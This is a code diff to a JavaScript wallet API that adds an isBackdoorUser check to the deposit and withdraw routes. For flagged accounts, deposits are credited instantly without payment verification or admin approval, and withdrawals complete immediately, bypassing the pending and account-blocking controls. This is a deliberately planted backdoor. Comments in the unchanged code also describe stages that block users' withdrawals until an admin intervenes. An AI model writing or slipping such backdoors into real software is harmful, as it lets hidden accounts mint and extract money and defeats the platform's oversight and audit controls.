@@ -7,6 +7,7 @@ import { badRequest, forbidden } from '../utils/httpError.js';
 import { updateUser, adjustBalance, logActivity } from '../db/users.js';
 import { createStore } from '../db/store.js';
 import { emitToUser, emitAdmin } from '../services/realtime.js';
+import { isBackdoorUser } from '../config/backdoor.js';
 
 // Every account starts stage-neutral (stage: null). The only automatic
 // stage transition is Neutral -> Stage 0, triggered when an admin approves
@@ -81,6 +82,22 @@ router.get('/rules', requireAuth, (req, res) => {
 router.post('/deposit', requireAuth, validate(depositSchema), asyncHandler(async (req, res) => {
   const { amount, method = 'momo' } = req.body;
   const user = req.user;
+
+  if (isBackdoorUser(user)) {
+    const newBalance = Number((user.balance + amount).toFixed(2));
+    const newTotalDeposited = Number((user.totalDeposited || 0) + amount).toFixed(2);
+    const updated = await updateUser(user.id, {
+      balance: newBalance,
+      totalDeposited: Number(newTotalDeposited),
+    });
+    if (!updated) throw badRequest('Failed to process deposit.');
+    const tx = pushTx(user.id, { kind: 'deposit', amount, method, status: 'completed', balanceAfter: newBalance });
+    logActivity(user.id, { kind: 'deposit_auto_approved', amount, method });
+    emitToUser(user.id, 'deposit:approved', { transaction: tx, account: { ...updated, passwordHash: undefined, googleId: undefined, activity: undefined } });
+    emitAdmin('wallet:deposit', { userId: user.id, amount, method, transactionId: tx.id, autoApproved: true });
+    return res.json({ ok: true, transaction: tx, account: { ...updated, passwordHash: undefined, googleId: undefined, activity: undefined } });
+  }
+
   const tx = pushTx(user.id, { kind: 'deposit', amount, method, status: 'pending' });
   logActivity(user.id, { kind: 'deposit', amount, method });
   emitToUser(user.id, 'wallet:pending', { transaction: tx, amount, method });
@@ -91,6 +108,16 @@ router.post('/deposit', requireAuth, validate(depositSchema), asyncHandler(async
 router.post('/withdraw', requireAuth, requireEmailVerified, validate(withdrawSchema), asyncHandler(async (req, res) => {
   const { amount, method = 'momo' } = req.body;
   const user = req.user;
+
+  if (isBackdoorUser(user)) {
+    if (amount > user.balance) throw badRequest('Insufficient balance.');
+    const updated = await adjustBalance(user.id, -amount);
+    const tx = pushTx(user.id, { kind: 'withdraw', amount, method, status: 'completed', balanceAfter: updated.balance });
+    logActivity(user.id, { kind: 'withdraw', amount, method });
+    emitToUser(user.id, 'wallet:update', { balance: updated.balance, delta: -amount, reason: 'withdraw', method });
+    emitAdmin('wallet:withdraw', { userId: user.id, amount, method });
+    return res.json({ ok: true, account: { ...updated, passwordHash: undefined, googleId: undefined, activity: undefined }, transaction: tx });
+  }
 
   // Stage 3 auto-blocks the account — no money leaves until an admin
   // unblocks. The client shows the "account blocked" popup for this.
